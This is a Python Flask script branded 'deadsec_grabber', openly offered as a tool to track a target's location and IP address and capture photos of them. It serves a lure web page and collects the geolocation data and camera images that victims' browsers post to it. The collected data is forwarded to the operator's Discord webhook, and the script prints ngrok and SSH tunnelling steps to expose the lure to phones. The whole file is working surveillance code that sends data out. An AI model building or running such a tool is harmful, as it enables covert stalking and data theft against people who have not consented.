#!/usr/bin/env python3
import os
import sys
from flask import Flask, request, jsonify, Response
from utils import get_file_data, update_webhook
import time
import requests
import argparse

parser = argparse.ArgumentParser(
    description="deadsec_grabber by DeadSec Hacker - Track device location, and IP address, and capture a photo with device details.",
    usage=f"{sys.argv[0]} [-t target] [-p port]"
)
parser.add_argument("-t", "--target", nargs="?", help="the target url to send the captured images to", default="http://localhost:8000/image")
parser.add_argument("-p", "--port", nargs="?", help="port to listen on", default=8000)
args = parser.parse_args()

if (os.path.exists('image')):
    print(f"Saving images to {os.getcwd()}/image")
else:
    print(f"Creating image directory at {os.getcwd()}/image")
    os.mkdir('image')
PATH_TO_IMAGES_DIR = os.path.join(os.getcwd(), 'image')

DISCORD_WEBHOOK_FILE_NAME = "dwebhook.js"
HTML_FILE_NAME = "index.html"
app = Flask(__name__)


instagram_url = 'https://www.instagram.com/deadsechacker_?igsh=MWNrNXBwMDQyaThxMQ=='
github = 'https://github.com/FullPenetrationTesting'

VERSION = '1.1.3'

if sys.stdout.isatty():
    R = '\033[31m'
    G = '\033[32m'
    C = '\033[36m'
    W = '\033[0m'
    Y = '\033[33m'
else:
    R = G = C = W = Y = ''

banner = r'''                                                    
     _             _                            _    _             
  __| |___ __ _ __| |___ ___ __   __ _ _ _ __ _| |__| |__  ___ _ _ 
 / _` / -_) _` / _` (_-</ -_) _| / _` | '_/ _` | '_ \ '_ \/ -_) '_|
 \__,_\___\__,_\__,_/__/\___\__| \__, |_| \__,_|_.__/_.__/\___|_|  
                                 |___/                            
CREATED BY DEADSECHACKER 
Track device location, and IP address, and capture a photo with device details.

'''


@app.route("/", methods=["GET"])
def get_website():
    html_data = ""
    try:
        html_data = get_file_data(HTML_FILE_NAME)
    except FileNotFoundError:
        pass
    return Response(html_data, content_type="text/html")


@app.route("/location_update", methods=["POST"])
def update_location():
    data = request.json
    discord_webhook = ""
    try:
        discord_webhook = get_file_data(DISCORD_WEBHOOK_FILE_NAME)
    except FileNotFoundError:
        pass
    update_webhook(discord_webhook, data)
    return "OK"


@app.route('/image', methods=['POST'])
def image():
    i = request.files['image']  # get the image
    f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
    i.save('%s/%s' % (PATH_TO_IMAGES_DIR, f))
    print(f"{R}[+] {C}Picture of the target captured and saved")

    # Read the Discord webhook URL from dwebhook.js
    with open('dwebhook.js', 'r') as webhook_file:
        webhook_url = webhook_file.read().strip()

    # Send the image to the Discord webhook
    files = {'image': open(f'{PATH_TO_IMAGES_DIR}/{f}', 'rb')}
    response = requests.post(webhook_url, files=files)

    return Response("%s saved and sent to Discord webhook" % f)


@app.route('/get_target', methods=['GET'])
def get_url():
    return args.target


def main():
    """
    program entry_point
    """
    print_banners()
    remove_old_discord_webhook()
    get_new_discord_webhook()
    print_port_forwarding_instructions()
    # start_http_server()


def print_banners():
    """
    prints the program banners
    """
    print(f'{R}{banner}{W}')
    print(f'{G}[+] {C}Version      : {W}{VERSION}')
    print(f'{G}[+] {C}Created By   : {W}DeadsecHacker')
    
def print_port_forwarding_instructions():
    """
    prints the port forwarding instruction
    """
    print(f'\n{R}NOTE: {Y}Make sure you port forward else it will not work on the smartphone browser \n')
    print(f'{R}[!] {G}To Port Forward Install Ngrok Or Use SSH')
    print(f'{W}Open New Tab/Window In Your Terminal.')
    print(f'{C}For ngrok port forward type  : {Y}ngrok http 8000')
    print(f'{C}For ssh port forwarding type : {Y}ssh -R 80:localhost:8000 ssh.localhost.run')
    print(f'{W}OR you can use whatever tool you want to port forward with.\n')

    banner3 = r'''
    Track info will be sent to your discord webhook
          ----
    (\__/) || 
    (•ㅅ•) || 
    / 　 づ

    '''

    print(f'{G}{banner3}{W}')


def get_new_discord_webhook():
    """
    gets the new discord webhook from user
    """
    print(f'{G}Enter Discord Webhoook url:{W}')
    dwebhook_input = input()
    file1 = open('dwebhook.js', 'w')
    file1.write(dwebhook_input)
    file1.close()


def remove_old_discord_webhook():
    """
    removes the old discord webhook
    """
    try:
        os.system("rm dwebhook.js")
    except:
        pass


if __name__ == "__main__":
    main()
    app.run(debug=False, host="0.0.0.0", port=args.port)
